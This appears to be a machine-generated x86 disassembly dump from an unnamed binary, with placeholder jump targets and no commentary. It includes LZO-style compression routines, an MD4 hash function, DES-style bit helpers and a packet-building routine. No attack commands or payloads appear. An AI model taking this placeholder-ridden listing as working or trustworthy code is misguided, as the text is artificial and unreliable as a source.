push ebp
mov ebp esp
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x34 ]
mov ebx edi
mov [ ebp - 0x60 ] eax
mov esi edx
call sub_100079d1
lea ebx [ ebp - 0x1c ]
mov ecx edi
call sub_10007933
xor eax eax
lea edi [ ebp - 0x24 ]
stosd [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0xc ]
stosd [ edi ]
push esi
lea ecx [ ebp - 0x4c ]
mov edx ebx
stosb [ edi ]
call sub_10008a7c
pop ecx
push esi
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0x15 ]
call sub_10008a7c
pop ecx
push esi
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0xe ]
call sub_10008a7c
pop ecx
push esi
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x34 ]
call sub_10008a7c
pop ecx
push esi
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x2d ]
call sub_10008a7c
pop ecx
push esi
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x26 ]
call sub_10008a7c
mov eax [ ebp - 0x60 ]
pop ecx
lea esi [ eax + 0x1 ]
xor ebx ebx
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
push ebx
push ebx
push 0x2
push 0x2
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
sub eax esi
mov edi eax
lea eax [ edi + 0x40 ]
lea ecx [ eax + 0x18 ]
mov edx eax
mov [ ebp - 0x50 ] eax
mov eax 0xff
and [ ebp - 0x50 ] eax
sar edx 0x8
push edx
push [ ebp - 0x50 ]
mov [ ebp - 0x58 ] edi
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x40
sar [ ebp - 0x58 ] 0x8
push [ ebp - 0x58 ]
mov [ ebp - 0x54 ] edi
and [ ebp - 0x54 ] eax
push [ ebp - 0x54 ]
mov esi ecx
push [ ebp - 0x58 ]
sar esi 0x8
push [ ebp - 0x54 ]
and ecx eax
push ebx
push ebx
push ebx
push 0x40
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push esi
push ecx
push ebx
push 0x18
pop eax
push eax
push ebx
push eax
push ebx
push ebx
push edx
push [ ebp - 0x50 ]
mov esi 0x400
push ebx
push eax
push ebx
push eax
push ebx
push ebx
push ebx
push 0x3
push ebx
push rw-data
push r--data
push esi
push [ ebp - 0x5c ]
call sub_10009a25
add esp 0xec
cmp eax ebx
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
lea ebx [ eax + edi ]
lea ecx [ ebx + 0x30 ]
cmp ecx esi
jb r-xdata
mov esi [ ebp - 0x5c ]
push edi
push [ ebp - 0x60 ]
add eax esi
push eax
call sub_10010170
mov edx [ ebp - 0x5c ]
add esp 0xc
mov eax ebx
lea edi [ esi + eax ]
push 0x6
pop ecx
lea esi [ ebp - 0x4c ]
[ edi ] [ esi ]
push 0x6
lea edi [ edx + eax + 0x18 ]
add eax 0x30
pop ecx
lea esi [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx eax
sar ecx 0x8
mov [ edx + 0x38 ] al
mov [ edx + 0x39 ] cl
or eax 0xffffffff
jmp r-xdata
sub_10007ca7
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add eax edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] eax
add edi 0x4
mov [ ecx ] edi
mov edi edx
mov edx edi
sub edx ebx
mov [ ebp - 0x8 ] edx
dec edx
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edx
cmp edx 0xbffe
ja r-xdata
movzx ecx [ edi + 0x2 ]
lea eax [ edi + 0x3 ]
mov [ ebp - 0x1c ] eax
mov al [ eax ]
movzx eax al
shl eax 0x6
xor eax ecx
shl eax 0x5
lea edx [ edi + 0x1 ]
movzx ecx [ edx ]
xor eax ecx
movzx ecx [ edi ]
shl eax 0x5
xor eax ecx
imul eax eax 0x21
shr eax 0x5
and eax 0x3fff
lea ecx [ eax * 4 + rw-data ]
mov ebx [ ecx ]
mov [ ebp - 0x20 ] edx
cmp ebx [ ebp + 0x8 ]
jb r-xdata
sub esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp - 0x20 ]
cmp [ ebp - 0x8 ] 0x800
jbe r-xdata
mov ax [ ebx ]
cmp ax [ edi ]
jne r-xdata
mov edx [ ebp - 0x1c ]
mov dl [ edx ]
mov [ ebp - 0x1 ] dl
cmp [ ebx + 0x3 ] dl
je r-xdata
mov al [ edi + 0x2 ]
cmp [ ebx + 0x2 ] al
jne r-xdata
and eax 0x7ff
xor eax 0x201f
lea ecx [ eax * 4 + rw-data ]
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] edi
sub edi [ ebp - 0xc ]
je r-xdata
mov eax edi
sub eax ebx
lea edx [ eax - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] edx
cmp edx 0xbffe
ja r-xdata
mov edi [ ebp - 0x1c ]
mov al [ edi ]
inc edi
cmp [ ebx + 0x3 ] al
jne r-xdata
mov edx edi
mov [ ebp - 0x20 ] edx
cmp edx 0x3
ja r-xdata
cmp eax 0x800
jbe r-xdata
dec edi
mov eax edi
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x8 ] 0x800
ja r-xdata
mov al [ edi ]
inc edi
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp edx 0x12
ja r-xdata
or [ esi - 0x2 ] dl
jmp r-xdata
mov al [ ebp - 0x1 ]
cmp [ ebx + 0x3 ] al
jne r-xdata
mov ecx 0x4000
sub al 0x2
cmp [ ebp - 0x8 ] ecx
ja r-xdata
mov ecx [ ebp - 0x14 ]
dec al
mov dl cl
shl al 0x3
and dl 0x7
or al dl
shl al 0x2
shr ecx 0x3
mov [ esi ] al
mov [ esi + 0x1 ] cl
jmp r-xdata
mov al [ edi ]
inc edi
cmp [ ebx + 0x5 ] al
jne r-xdata
lea eax [ edx - 0x12 ]
mov [ esi ] 0x0
mov ecx 0xff
inc esi
mov [ ebp - 0x18 ] eax
cmp eax ecx
jbe r-xdata
lea eax [ edx - 0x3 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov al [ eax ]
mov [ esi ] al
inc esi
inc [ ebp - 0xc ]
dec edx
jne r-xdata
sub [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
shr ecx 0xb
and cl 0x8
or cl al
or cl 0x10
mov [ esi ] cl
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] ecx
or al 0x20
jmp r-xdata
add esi 0x2
mov [ ebp - 0xc ] edi
jmp r-xdata
mov al [ edi ]
inc edi
cmp [ ebx + 0x6 ] al
jne r-xdata
mov [ esi ] al
inc esi
add eax 0xffffff00
xor edx edx
div ecx
lea edi [ eax + 0x1 ]
push edi
push 0x0
push esi
call sub_1000ffa0
add esp 0xc
add esi edi
mov eax [ ebp - 0x10 ]
add eax 0xfffffff3
cmp edi eax
jb r-xdata
mov [ esi ] al
jmp r-xdata
mov al [ edi ]
inc edi
cmp [ ebx + 0x7 ] al
jne r-xdata
sub [ ebp - 0x18 ] 0xff
dec edi
jne r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov cl al
inc esi
shl cl 0x2
shr eax 0x6
mov [ esi ] cl
mov [ esi + 0x1 ] al
mov al [ edi ]
inc edi
cmp [ ebx + 0x8 ] al
jne r-xdata
add ebx 0x9
jmp r-xdata
cmp edi [ ebp - 0x10 ]
jb r-xdata
mov al [ ebx ]
cmp al [ edi ]
jne r-xdata
mov ebx edi
sub ebx [ ebp - 0xc ]
mov eax 0x4000
cmp [ ebp - 0x8 ] eax
ja r-xdata
inc ebx
inc edi
sub [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
shr eax 0xb
and al 0x8
cmp ebx 0x9
ja r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
cmp ebx 0x21
ja r-xdata
sub ebx 0x9
or al 0x10
mov [ esi ] al
sub bl 0x2
or al bl
or al 0x10
sub ebx 0x21
mov [ esi ] 0x20
jmp r-xdata
sub bl 0x2
or bl 0x20
mov [ esi ] bl
jmp r-xdata
xor edx edx
mov ecx 0xff
lea eax [ ebx - 0x100 ]
div ecx
inc eax
push eax
push 0x0
push esi
mov [ ebp - 0x18 ] eax
call sub_1000ffa0
add esp 0xc
add esi [ ebp - 0x18 ]
inc esi
cmp ebx 0xff
jbe r-xdata
sub ebx 0xff
dec [ ebp - 0x18 ]
jne r-xdata
jmp r-xdata
sub_10007f87
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx eax
push edi
mov edi ecx
cmp ebx 0xd
ja r-xdata
mov esi [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
push edi
call sub_10007ca7
mov esi [ esi ]
add esp 0xc
add esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx eax
mov ecx ebx
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ esi ] 0x11
add esi 0x2
mov [ esi ] 0x0
sub esi [ ebp + 0x8 ]
pop edi
inc esi
mov [ eax ] esi
pop esi
xor eax eax
pop ebx
leave
retn
sub edi ecx
add edi ebx
mov [ ebp - 0xc ] edi
cmp esi [ ebp + 0x8 ]
jne r-xdata
test ecx ecx
je r-xdata
cmp ecx 0x3
ja r-xdata
cmp ecx 0xee
ja r-xdata
cmp ecx 0x12
ja r-xdata
or [ esi - 0x2 ] cl
jmp r-xdata
lea eax [ ecx + 0x11 ]
jmp r-xdata
lea eax [ ecx - 0x12 ]
mov [ esi ] 0x0
mov ebx 0xff
inc esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jbe r-xdata
lea eax [ ecx - 0x3 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ esi ] al
inc esi
add eax 0xffffff00
xor edx edx
mov ecx ebx
div ecx
lea edi [ eax + 0x1 ]
push edi
push 0x0
push esi
call sub_1000ffa0
add esp 0xc
add esi edi
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
dec ecx
jne r-xdata
sub [ ebp - 0x8 ] ebx
dec edi
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
sub_10008053
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov dl [ esi ]
add eax esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
mov eax [ ebp + 0x8 ]
push edi
push 0x4
pop ebx
cmp dl 0x11
jbe r-xdata
movzx esi [ ecx ]
inc ecx
cmp esi 0x10
jae r-xdata
movzx edi dl
sub edi 0x11
lea ecx [ esi + 0x1 ]
cmp edi ebx
jb r-xdata
cmp esi 0x40
jb r-xdata
test esi esi
jne r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
cmp edi 0x1
jbe r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec edi
jne r-xdata
cmp esi 0x20
jb r-xdata
mov edx esi
shr edx 0x2
and edx 0x7
mov edi eax
sub edi edx
movzx edx [ ecx ]
shl edx 0x3
sub edi edx
dec edi
shr esi 0x5
inc ecx
dec esi
mov edx [ ecx ]
mov [ eax ] edx
add eax ebx
add ecx ebx
dec esi
je r-xdata
jmp r-xdata
movzx esi [ ecx ]
inc ecx
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
cmp edi 0x2
jbe r-xdata
jmp r-xdata
mov edi eax
cmp esi 0x10
jb r-xdata
and esi 0x1f
jne r-xdata
mov dl [ edi ]
mov [ eax ] dl
inc eax
inc edi
dec esi
jne r-xdata
jmp r-xdata
movzx esi [ ecx ]
inc ecx
cmp esi 0x10
jae r-xdata
cmp esi ebx
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
movzx edx [ ecx ]
shl edx 0x2
sub edi edx
shr esi 0x2
sub edi esi
mov dl [ edi - 0x1 ]
mov [ eax ] dl
mov dl [ edi ]
inc ecx
mov [ eax + 0x1 ] dl
add eax 0x2
jmp r-xdata
mov edx esi
and edx 0x8
shl edx 0xb
sub edi edx
and esi 0x7
jne r-xdata
movzx edx [ ecx ]
shr edx 0x2
mov edi eax
sub edi edx
dec edi
add ecx 0x2
jmp r-xdata
jmp r-xdata
movzx edi [ ecx - 0x2 ]
and edi 0x3
je r-xdata
movzx edx [ ecx ]
shl edx 0x2
mov edi eax
sub edi edx
shr esi 0x2
sub edi esi
mov dl [ edi - 0x801 ]
mov [ eax ] dl
mov dl [ edi - 0x800 ]
mov [ eax + 0x1 ] dl
mov dl [ edi - 0x7ff ]
inc ecx
mov [ eax + 0x2 ] dl
add eax 0x3
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec esi
jne r-xdata
mov edx [ ecx ]
mov [ eax ] edx
sub esi ebx
add eax ebx
add ecx ebx
cmp esi ebx
jae r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0xf ]
inc ecx
movzx edx [ ecx ]
shr edx 0x2
sub edi edx
add ecx 0x2
cmp edi eax
je r-xdata
jmp r-xdata
cmp esi 0x6
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
test esi esi
je r-xdata
sub eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax ecx
sub eax [ ebp - 0x4 ]
cmp ecx [ ebp - 0x4 ]
pop edi
sbb ecx ecx
and ecx 0xfffffffc
add ecx 0xfffffffc
neg eax
sbb eax eax
pop esi
and eax ecx
pop ebx
leave
retn
sub edi 0x4000
cmp [ ecx ] 0x0
je r-xdata
mov dl [ edi ]
mov [ eax ] dl
mov dl [ edi + 0x1 ]
mov [ eax + 0x1 ] dl
add eax 0x2
add edi 0x2
mov edx eax
sub edx edi
cmp edx ebx
jl r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0x1f ]
inc ecx
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec esi
jne r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0x7 ]
inc ecx
mov edx [ edi ]
mov [ eax ] edx
add eax ebx
add edi ebx
sub esi 0x2
jmp r-xdata
mov edx [ edi ]
mov [ eax ] edx
sub esi ebx
add eax ebx
add edi ebx
cmp esi ebx
jae r-xdata
test esi esi
je r-xdata
mov dl [ edi ]
mov [ eax ] dl
inc eax
inc edi
dec esi
jne r-xdata
jmp r-xdata
sub_10008281
test edx edx
je r-xdata
retn
push esi
lea esi [ edx - 0x1 ]
shr esi 0x2
inc ecx
add eax 0x2
inc esi
mov dl [ eax - 0x2 ]
mov [ ecx - 0x1 ] dl
mov dl [ eax - 0x1 ]
mov [ ecx ] dl
mov dl [ eax ]
mov [ ecx + 0x1 ] dl
mov dl [ eax + 0x1 ]
mov [ ecx + 0x2 ] dl
add eax 0x4
add ecx 0x4
dec esi
jne r-xdata
pop esi
sub_100082b2
push ebp
mov ebp esp
push ecx
mov ecx [ esi + 0x10 ]
push ebx
push edi
mov edi eax
mov eax ecx
shr eax 0x3
mov edx edi
lea ecx [ ecx + edi * 8 ]
shl edx 0x3
and eax 0x3f
mov [ esi + 0x10 ] ecx
cmp ecx edx
jae r-xdata
push 0x40
mov ecx edi
shr ecx 0x1d
add [ esi + 0x14 ] ecx
pop ebx
sub ebx eax
cmp edi ebx
jb r-xdata
inc [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push ebx
push [ ebp + 0x8 ]
lea eax [ eax + esi + 0x18 ]
push eax
call sub_10010170
lea eax [ esi + 0x18 ]
push eax
mov ecx esi
call sub_1000834a
add esp 0x10
mov [ ebp - 0x4 ] ebx
add ebx 0x3f
jmp r-xdata
cmp ebx edi
jb r-xdata
mov eax [ ebp + 0x8 ]
lea eax [ eax + ebx - 0x3f ]
push eax
mov ecx esi
call sub_1000834a
add [ ebp - 0x4 ] 0x40
pop ecx
add ebx 0x40
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub edi ecx
add ecx [ ebp + 0x8 ]
push edi
push ecx
lea eax [ eax + esi + 0x18 ]
push eax
call sub_10010170
add esp 0xc
pop edi
pop ebx
leave
retn
sub_1000834a
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x10
mov [ ebp - 0x4c ] ecx
add eax 0x2
lea edx [ ebp - 0x44 ]
pop esi
movzx edi [ eax + 0x1 ]
movzx ebx [ eax ]
shl edi 0x8
or edi ebx
movzx ebx [ eax - 0x1 ]
shl edi 0x8
or edi ebx
movzx ebx [ eax - 0x2 ]
shl edi 0x8
or edi ebx
mov [ edx ] edi
add edx 0x4
add eax 0x4
dec esi
jne r-xdata
mov edi [ ecx + 0x4 ]
mov esi [ ecx + 0x8 ]
mov edx [ ecx + 0xc ]
mov ebx esi
and ebx edi
mov eax edi
not eax
and eax edx
or eax ebx
add eax [ ebp - 0x44 ]
mov ebx edi
add eax [ ecx ]
rol eax 0x3
and ebx eax
mov ecx eax
not ecx
and ecx esi
or ecx ebx
add ecx [ ebp - 0x40 ]
add ecx edx
rol ecx 0x7
mov edx ecx
not edx
and edx edi
mov ebx ecx
and ebx eax
or edx ebx
add edx [ ebp - 0x3c ]
mov ebx ecx
add edx esi
rol edx 0xb
and ebx edx
mov esi edx
not esi
and esi eax
or esi ebx
add esi [ ebp - 0x38 ]
mov ebx edx
add esi edi
ror esi 0xd
and ebx esi
mov edi esi
not edi
and edi ecx
or edi ebx
add edi [ ebp - 0x34 ]
mov ebx esi
add edi eax
rol edi 0x3
and ebx edi
mov eax edi
not eax
and eax edx
or eax ebx
add eax [ ebp - 0x30 ]
add eax ecx
rol eax 0x7
mov ecx eax
not ecx
and ecx esi
mov ebx eax
and ebx edi
or ecx ebx
add ecx [ ebp - 0x2c ]
mov ebx eax
add ecx edx
rol ecx 0xb
mov edx ecx
not edx
and edx edi
and ebx ecx
or edx ebx
add edx [ ebp - 0x28 ]
mov ebx ecx
add edx esi
ror edx 0xd
mov esi edx
not esi
and esi eax
and ebx edx
or esi ebx
add esi [ ebp - 0x24 ]
mov ebx edx
add esi edi
rol esi 0x3
and ebx esi
mov edi esi
not edi
and edi ecx
or edi ebx
add edi [ ebp - 0x20 ]
add edi eax
rol edi 0x7
mov ebx edi
mov eax edi
and eax esi
not ebx
and ebx edx
or ebx eax
add ebx [ ebp - 0x1c ]
add ebx ecx
rol ebx 0xb
mov ecx edi
and ecx ebx
mov eax ebx
not eax
and eax esi
or eax ecx
add eax [ ebp - 0x18 ]
add eax edx
ror eax 0xd
mov ecx eax
not ecx
and ecx edi
mov edx ebx
and edx eax
or ecx edx
add ecx [ ebp - 0x14 ]
mov [ ebp - 0x48 ] eax
add ecx esi
rol ecx 0x3
and eax ecx
mov edx ecx
not edx
and edx ebx
or edx eax
add edx [ ebp - 0x10 ]
add edx edi
rol edx 0x7
mov eax edx
not eax
and eax [ ebp - 0x48 ]
mov esi edx
and esi ecx
or eax esi
add eax [ ebp - 0xc ]
mov edi edx
add eax ebx
rol eax 0xb
and edi eax
mov esi eax
not esi
and esi ecx
or esi edi
add esi [ ebp - 0x8 ]
mov edi eax
add esi [ ebp - 0x48 ]
ror esi 0xd
or edi esi
mov [ ebp - 0x48 ] esi
and edi edx
mov esi eax
and esi [ ebp - 0x48 ]
or edi esi
add edi [ ebp - 0x44 ]
lea ecx [ edi + ecx + 0x5a827999 ]
mov edi [ ebp - 0x48 ]
rol ecx 0x3
mov esi edi
or esi ecx
and edi ecx
mov ebx esi
and ebx eax
or ebx edi
add ebx [ ebp - 0x34 ]
lea edx [ ebx + edx + 0x5a827999 ]
rol edx 0x5
and esi edx
or esi edi
add esi [ ebp - 0x24 ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edx
mov edi eax
and edi ecx
or esi edi
add esi [ ebp - 0x14 ]
mov edi [ ebp - 0x48 ]
lea esi [ esi + edi + 0x5a827999 ]
rol esi 0xd
mov edi eax
or edi esi
and edi edx
mov ebx eax
and ebx esi
or edi ebx
add edi [ ebp - 0x40 ]
mov [ ebp - 0x48 ] esi
lea ecx [ edi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x48 ] ecx
mov edi [ ebp - 0x48 ]
mov ebx esi
and ebx ecx
and edi eax
or edi ebx
add edi [ ebp - 0x30 ]
lea edi [ edi + edx + 0x5a827999 ]
mov edx [ ebp - 0x48 ]
rol edi 0x5
and edx edi
or edx ebx
add edx [ ebp - 0x20 ]
lea eax [ edx + eax + 0x5a827999 ]
rol eax 0x9
mov edx eax
or edx ecx
and edx edi
mov ebx eax
and ebx ecx
or edx ebx
add edx [ ebp - 0x10 ]
mov ebx eax
lea edx [ edx + esi + 0x5a827999 ]
rol edx 0xd
mov esi eax
or esi edx
and esi edi
and ebx edx
or esi ebx
add esi [ ebp - 0x3c ]
mov [ ebp - 0x48 ] edx
lea ecx [ esi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x48 ] ecx
mov esi [ ebp - 0x48 ]
and esi eax
mov ebx edx
and ebx ecx
or esi ebx
add esi [ ebp - 0x2c ]
lea edi [ esi + edi + 0x5a827999 ]
mov esi [ ebp - 0x48 ]
rol edi 0x5
and esi edi
or esi ebx
add esi [ ebp - 0x1c ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edi
mov ebx eax
and ebx ecx
or esi ebx
add esi [ ebp - 0xc ]
mov ebx eax
lea edx [ esi + edx + 0x5a827999 ]
rol edx 0xd
and ebx edx
mov esi eax
or esi edx
and esi edi
or esi ebx
add esi [ ebp - 0x38 ]
mov [ ebp - 0x48 ] edx
lea ecx [ esi + ecx + 0x5a827999 ]
rol ecx 0x3
or [ ebp - 0x48 ] ecx
mov esi [ ebp - 0x48 ]
and esi eax
mov ebx edx
and ebx ecx
or esi ebx
add esi [ ebp - 0x28 ]
lea edi [ esi + edi + 0x5a827999 ]
mov esi [ ebp - 0x48 ]
rol edi 0x5
and esi edi
or esi ebx
add esi [ ebp - 0x18 ]
lea eax [ esi + eax + 0x5a827999 ]
rol eax 0x9
mov esi eax
or esi ecx
and esi edi
mov ebx eax
and ebx ecx
or esi ebx
add esi [ ebp - 0x8 ]
lea edx [ esi + edx + 0x5a827999 ]
rol edx 0xd
mov esi edi
xor esi eax
xor esi edx
add esi [ ebp - 0x44 ]
lea ecx [ esi + ecx + 0x6ed9eba1 ]
rol ecx 0x3
mov esi eax
xor esi edx
xor esi ecx
add esi [ ebp - 0x24 ]
lea edi [ esi + edi + 0x6ed9eba1 ]
rol edi 0x9
mov esi edi
xor esi edx
xor esi ecx
add esi [ ebp - 0x34 ]
lea eax [ esi + eax + 0x6ed9eba1 ]
rol eax 0xb
mov esi edi
xor esi eax
mov ebx esi
xor ebx ecx
add ebx [ ebp - 0x14 ]
lea edx [ ebx + edx + 0x6ed9eba1 ]
rol edx 0xf
xor esi edx
add esi [ ebp - 0x3c ]
lea ecx [ esi + ecx + 0x6ed9eba1 ]
rol ecx 0x3
mov esi eax
xor esi edx
xor esi ecx
add esi [ ebp - 0x1c ]
lea esi [ esi + edi + 0x6ed9eba1 ]
rol esi 0x9
mov edi esi
xor edi edx
xor edi ecx
add edi [ ebp - 0x2c ]
lea edi [ edi + eax + 0x6ed9eba1 ]
rol edi 0xb
mov ebx esi
xor ebx edi
mov eax ebx
xor eax ecx
add eax [ ebp - 0xc ]
lea eax [ eax + edx + 0x6ed9eba1 ]
rol eax 0xf
xor ebx eax
add ebx [ ebp - 0x40 ]
mov edx edi
xor edx eax
lea ecx [ ebx + ecx + 0x6ed9eba1 ]
rol ecx 0x3
xor edx ecx
add edx [ ebp - 0x20 ]
lea esi [ edx + esi + 0x6ed9eba1 ]
rol esi 0x9
mov edx esi
xor edx eax
xor edx ecx
add edx [ ebp - 0x30 ]
mov ebx esi
lea edi [ edx + edi + 0x6ed9eba1 ]
rol edi 0xb
xor ebx edi
mov edx ebx
xor edx ecx
add edx [ ebp - 0x10 ]
lea edx [ edx + eax + 0x6ed9eba1 ]
rol edx 0xf
xor ebx edx
add ebx [ ebp - 0x38 ]
mov eax edi
lea ecx [ ebx + ecx + 0x6ed9eba1 ]
rol ecx 0x3
xor eax edx
xor eax ecx
add eax [ ebp - 0x18 ]
lea esi [ eax + esi + 0x6ed9eba1 ]
rol esi 0x9
mov eax esi
xor eax edx
xor eax ecx
add eax [ ebp - 0x28 ]
lea edi [ eax + edi + 0x6ed9eba1 ]
mov eax [ ebp - 0x4c ]
mov ebx [ eax ]
add ebx ecx
mov [ eax ] ebx
rol edi 0xb
mov ebx esi
xor ebx edi
xor ebx ecx
add ebx [ ebp - 0x8 ]
lea ecx [ ebx + edx + 0x6ed9eba1 ]
rol ecx 0xf
add ecx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
add ecx edi
mov [ eax + 0x8 ] ecx
mov ecx [ eax + 0xc ]
add ecx esi
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008d64
leave
retn
sub_1000882f
push ebp
mov ebp esp
push esi
push edi
xor edi edi
add edx 0x2
mov eax [ ebp + 0x8 ]
lea esi [ edi + eax ]
mov al [ esi ]
push 0x7
pop ecx
call sub_100087cb
mov [ edx - 0x2 ] al
mov al [ esi ]
push 0x6
pop ecx
call sub_100087cb
mov [ edx - 0x1 ] al
mov al [ esi ]
push 0x5
pop ecx
call sub_100087cb
mov [ edx ] al
mov al [ esi ]
push 0x4
pop ecx
call sub_100087cb
mov [ edx + 0x1 ] al
mov al [ esi ]
push 0x3
pop ecx
call sub_100087cb
mov [ edx + 0x2 ] al
mov al [ esi ]
push 0x2
pop ecx
call sub_100087cb
mov [ edx + 0x3 ] al
mov al [ esi ]
xor ecx ecx
inc ecx
call sub_100087cb
mov [ edx + 0x4 ] al
mov al [ esi ]
xor ecx ecx
call sub_100087cb
mov [ edx + 0x5 ] al
inc edi
add edx 0x8
cmp edi 0x8
jl r-xdata
pop edi
pop esi
pop ebp
retn
sub_100088b2
push ebp
mov ebp esp
xor ecx ecx
add eax 0x2
push esi
mov dl [ eax - 0x2 ]
add dl dl
add dl [ eax - 0x1 ]
mov esi [ ebp + 0x8 ]
add dl dl
add dl [ eax ]
add eax 0x8
add dl dl
add dl [ eax - 0x7 ]
add dl dl
add dl [ eax - 0x6 ]
add dl dl
add dl [ eax - 0x5 ]
add dl dl
add dl [ eax - 0x4 ]
add dl dl
add dl [ eax - 0x3 ]
mov [ ecx + esi ] dl
inc ecx
cmp ecx 0x8
jl r-xdata
pop esi
pop ebp
retn
sub_100088f2
push ebp
mov ebp esp
push ecx
push ebx
push edi
push [ ebp + 0xc ]
mov edi eax
call sub_10009991
cmp [ ebp + 0xc ] 0x0
pop ecx
mov ebx eax
jle r-xdata
push [ ebp + 0xc ]
push ebx
push [ ebp + 0x10 ]
call sub_10010170
push ebx
call sub_10009957
add esp 0x10
pop edi
pop ebx
leave
retn
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
sub esi edi
mov ecx ebx
sub edi ebx
mov [ ebp - 0x4 ] eax
lea eax [ edi + ecx ]
movzx edx [ eax + esi ]
movzx eax [ eax ]
add edx eax
dec edx
neg edx
sbb dl dl
inc dl
mov [ ecx ] dl
inc ecx
dec [ ebp - 0x4 ]
jne r-xdata
pop esi
sub_10008950
push ebp
mov ebp esp
push esi
push edi
call sub_10009991
mov esi eax
xor eax eax
pop ecx
test edi edi
jle r-xdata
push edi
push esi
push [ ebp + 0x10 ]
call sub_10010170
push esi
call sub_10009957
add esp 0x10
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + eax * 4 ]
mov edx [ ebp + 0x8 ]
mov cl [ ecx + edx - 0x1 ]
mov [ esi + eax ] cl
inc eax
cmp eax edi
jl r-xdata
sub_1000898e
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi edx
push edi
mov [ ebp - 0x24 ] 0x1c
sub [ ebp - 0x24 ] esi
push [ ebp - 0x24 ]
mov ebx ecx
lea eax [ esi + ebx ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x28 ] esi
call sub_10010170
push esi
lea eax [ ebp - 0x4 ]
sub eax esi
push ebx
push eax
mov [ ebp - 0x2c ] eax
call sub_10010170
mov eax [ ebp - 0x28 ]
push 0x7
pop ecx
push [ ebp - 0x24 ]
add eax ebx
add eax 0x1c
push eax
lea eax [ ebp - 0x20 ]
lea esi [ ebp - 0x20 ]
mov edi ebx
push eax
[ edi ] [ esi ]
call sub_10010170
push [ ebp - 0x28 ]
add ebx 0x1c
